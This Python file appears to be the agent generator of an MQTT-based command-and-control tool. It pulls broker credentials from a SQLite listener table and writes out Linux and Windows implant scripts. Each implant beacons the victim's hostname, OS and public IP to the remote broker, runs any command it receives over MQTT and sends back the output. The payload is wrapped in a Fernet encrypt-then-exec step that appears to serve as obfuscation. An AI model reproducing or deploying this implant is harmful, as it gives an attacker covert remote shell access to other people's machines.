#generate some agents

import os
import sqlite3
from collections import namedtuple
import pandas as pd

def agentlist():
	dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqt-config.db")
	conn = sqlite3.connect(dbfile)
	conn.isolation_level = None
	cursor = conn.cursor()
	df = pd.read_sql_query("SELECT Active FROM listener WHERE Active = 'yes'", conn)
	print("\n")
	if df.empty == True:
		print("No active listeners have been selected, please add or select a listener.\n")
		print("\n")
		return
	conn.close
	AF = namedtuple('AF', 'ID Transport Address Port User Pass')
	conn = sqlite3.connect(dbfile)
	conn.isolation_level = None
	conn.row_factory = lambda cursor, row: AF(*row)
	cursor = conn.cursor()
	for row in cursor.execute("SELECT ID, Transport, Address, Port, User, Pass from listener WHERE Active = 'yes'"):
		bid=str(row.ID)
		btrans=str(row.Transport)
		bbroker=str(row.Address)
		bport=int(row.Port)
		busername=str(row.User)
		bpassword=str(row.Pass)
	conn.close()
	linagent = (os.path.dirname(os.path.realpath(__file__))+"/agents/"+str(bid)+"-"+btrans+"-lin.py")
	winagent = (os.path.dirname(os.path.realpath(__file__))+"/agents/"+str(bid)+"-"+btrans+"-win.py")
	codestart = '''
from cryptography.fernet import Fernet
whatevs=b"""
_E='beacon/checkin/'
_D='target/'
_C='UTF-8'
_B='/'
_A=','
import paho.mqtt.client as mqtt,subprocess,os,platform
clientname=platform.node()
oss=platform.system()'''
	
	flinagent = open(linagent, "w")
	flinagent.write(codestart)
	flinagent.close
	flinagent2 = open(linagent, "a")
	flinagent2.write("\nbroker = '"+bbroker+"'\n"+"port = "+str(bport)+"\n"+"atrans = '"+btrans+"'\n"+"username = '"+busername+"'\n"+"password = '"+bpassword+"'\n")	

	lincodeend = '''
hosti=subprocess.Popen(['wget','-q','-O','-','http://ifconfig.me'],stdout=subprocess.PIPE).communicate()[0]
hostip=hosti.decode(_C).strip()
yomama=atrans+_A+hostip+_A+clientname+_A+username+_A+oss+_A+broker+_A+str(port)
topic_cmd=_D+clientname+_B
topic_out='output/'+clientname+_B
topic_err='error/'+clientname+_B
topic_cwd='cwd/'+clientname+_B
topic_chk=_E
topic_bea='beacon/clients/'
def on_connect(client,userdata,flags,rc):client.subscribe(topic_cmd);client.subscribe(topic_chk);client.publish(topic_bea,payload=yomama)
def on_checkin(client,userdata,msg):client.publish(topic_bea,payload=yomama)
def on_command(client,userdata,msg):
	wCommand=msg.payload.decode(_C)
	try:process=subprocess.Popen(wCommand.split(),stdout=subprocess.PIPE);output,error=process.communicate();payload1=output;client.publish(topic_out,payload1);tcwd=os.getcwd();client.publish(topic_cwd,tcwd)
	except:client.connect(broker,port,60);client.publish(topic_err,payload='Error Occured')
client=mqtt.Client(clientname,False,transport=atrans)
client.tls_set()
client.message_callback_add(_D+clientname+_B,on_command)
client.message_callback_add(_E,on_checkin)
client.on_connect=on_connect
client.username_pw_set(username,password)
client.connect(broker,port,60)
client.loop_forever()"""
key=Fernet.generate_key()
encryption_type=Fernet(key)
encrypted_message=encryption_type.encrypt(whatevs)
decrypted_message=encryption_type.decrypt(encrypted_message)
exec(decrypted_message)'''
	wincodeend = '''
hosti=subprocess.Popen(['curl', '--silent', 'http://ifconfig.me'],stdout=subprocess.PIPE).stdout.read()
hostip=hosti.decode(_C).strip()
yomama=atrans+_A+hostip+_A+clientname+_A+username+_A+oss+_A+broker+_A+str(port)
topic_cmd=_D+clientname+_B
topic_out='output/'+clientname+_B
topic_err='error/'+clientname+_B
topic_cwd='cwd/'+clientname+_B
topic_chk=_E
topic_bea='beacon/clients/'
def on_connect(client,userdata,flags,rc):client.subscribe(topic_cmd);client.subscribe(topic_chk);client.publish(topic_bea,payload=yomama)
def on_checkin(client,userdata,msg):client.publish(topic_bea,payload=yomama)
def on_command(client,userdata,msg):
	wCommand=msg.payload.decode(_C)
	try:process=subprocess.Popen(wCommand.split(),stdout=subprocess.PIPE,shell=True);output,error=process.communicate();payload1=output;client.publish(topic_out,payload1);tcwd=os.getcwd();client.publish(topic_cwd,tcwd)
	except:client.connect(broker,port,60);client.publish(topic_err,payload='Error Occured')
client=mqtt.Client(clientname,False,transport=atrans)
client.tls_set()
client.message_callback_add(_D+clientname+_B,on_command)
client.message_callback_add(_E,on_checkin)
client.on_connect=on_connect
client.username_pw_set(username,password)
client.connect(broker,port,60)
client.loop_forever()"""
key=Fernet.generate_key()
encryption_type=Fernet(key)
encrypted_message=encryption_type.encrypt(whatevs)
decrypted_message=encryption_type.decrypt(encrypted_message)
exec(decrypted_message)'''
	flinagent2.write(lincodeend)
	flinagent2.close
	#windows agent
	fwinagent = open(winagent, "w")
	fwinagent.write(codestart)
	fwinagent.close
	fwinagent2 = open(winagent, "a")
	fwinagent2.write("\nbroker = '"+bbroker+"'\n"+"port = "+str(bport)+"\n"+"atrans = '"+btrans+"'\n"+"username = '"+busername+"'\n"+"password = '"+bpassword+"'\n")
	fwinagent2.write(wincodeend)
	fwinagent2.close
	print("\nLinux python agent for listener "+bid+" located at "+linagent+"\n")
	print("\nWindows python agent for listener "+bid+" located at "+winagent+"\n")

